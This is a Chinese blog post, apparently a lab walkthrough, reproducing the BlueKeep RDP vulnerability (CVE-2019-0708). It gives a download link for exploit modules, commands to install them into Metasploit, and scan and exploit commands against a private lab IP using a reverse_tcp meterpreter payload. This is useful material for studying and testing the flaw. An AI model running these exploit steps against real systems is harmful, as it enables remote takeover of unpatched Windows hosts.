# CVE-2019-0708 复现 - 香农 Shannon - 博客园

> 原文：[`www.cnblogs.com/ethtool/p/13521541.html`](https://www.cnblogs.com/ethtool/p/13521541.html)

# 0x00 漏洞简介

Microsoft 远程桌面服务远程代码执行漏洞（漏洞编号：CVE-2019-0708）指的是攻击者在未经身份校验的情况下，通过 RDP 连接目标系统并向其发送精心构造的请求，即可直接导致远程代码执行，整个过程不需要用户交互。攻击者一旦利用成功即可在目标系统上安装程序，查看、更改或者删除数据，创建具有完整用户权限的新账户，危害极大。

2019 年 5 月 14 日，微软官方通过更正远程桌面服务处理连接请求的方式修复了此漏洞。Windows 8 以及 Windows 10 不受此漏洞的影响。由于该漏洞危害严重，微软额外为 Windows XP，Windows 2003 这些已经停止支持的系统发布了补丁。

受此次漏洞影响的 Windows 版本范围如下：

*   Windows 7
*   Windows 2008 R2
*   Windows 2008
*   Windows 2003
*   Windows XP

# 0X01 复现

## 0x001 准备工作：

**由于以往的 exp 链接已经失效，贡献自己保存的传送门下载[`wwa.lanzous.com/ieeybfqur5i`](https://wwa.lanzous.com/ieeybfqur5i)：**（**仅为测试使用，请勿用于非法用途！否则后果自负**）

**更新下 msf: 参考：[`www.cnblogs.com/ethtool/p/13521393.html`](https://www.cnblogs.com/ethtool/p/13521393.html)**

## **0x002 开始：**

```
1 cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
2 cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 3 cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/
4 cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp
```

扫描：

```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.56.133 exploit
```

攻击：

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.56.133 set payload windows/x64/meterpreter/reverse_tcp  #调用反弹的攻击载荷
exploit
```